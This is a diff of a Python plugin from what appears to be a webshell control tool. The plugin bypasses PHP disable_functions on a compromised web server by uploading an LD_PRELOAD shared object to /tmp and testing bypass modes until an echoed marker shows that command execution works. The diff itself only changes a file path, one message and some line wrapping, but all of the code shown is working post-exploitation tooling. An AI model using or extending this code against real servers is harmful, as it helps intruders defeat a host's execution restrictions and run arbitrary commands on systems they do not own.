@@ -1,5 +1,5 @@
 from libs.config import alias, color, gget, gset
-from os import path, getcwd
+from os import path
 from uuid import uuid4
 from libs.myapp import is_windows, send, get_system_code
 from webshell_plugins.upload import run as upload
@@ -43,7 +43,7 @@ def set_mode(mode: int, test: bool = False):
             filename = "/tmp/%s.so" % str(uuid4())
             ld_preload_func = send(get_detectd_ld_preload()).r_text.strip()
             upload_result = upload(
-                path.join(getcwd(), "auxiliary", "ld_preload", "ld_preload_x86_64.so"), filename, True)
+                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x86_64.so"), filename, True)
             if (not upload_result):
                 return
             gset("webshell.ld_preload_path", filename, True, "webshell")
@@ -61,12 +61,14 @@ def set_mode(mode: int, test: bool = False):
             return False
         text = res.r_text.strip()
         if ("exist" not in text):
-            print(color.red(f"\nNo {ext} extension!\n"))
+            print(color.red(f"\nNo {ext} extension\n"))
             return False
     if (not test):
         if (mode == 7):
-            print(color.yellow(f"\nYou may need to wait 1 second to get the result..\n"))
-        print(f"\nSet bypass disable_functions: {mode}-{mode_to_desc_dict[mode]}\n")
+            print(color.yellow(
+                f"\nYou may need to wait 1 second to get the result..\n"))
+        print(
+            f"\nSet bypass disable_functions: {mode}-{mode_to_desc_dict[mode]}\n")
         gset("webshell.bypass_df", mode, True, "webshell")
     return True
 
@@ -157,10 +159,12 @@ def run(mode: str = '0'):
         for test_mode in test_list:
             print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
             if (set_mode(test_mode, True)):
-                res = send(get_system_code("echo 6ac2ed344113c07c0028327388553273", mode=test_mode))
+                res = send(get_system_code(
+                    "echo 6ac2ed344113c07c0028327388553273", mode=test_mode))
                 if (res and "6ac2ed344113c07c0028327388553273" in res.r_text):
                     print(color.green("\n    Success\n"))
-                    print(f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
+                    print(
+                        f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
                     gset("webshell.bypass_df", test_mode, True, "webshell")
                     break
                 else:
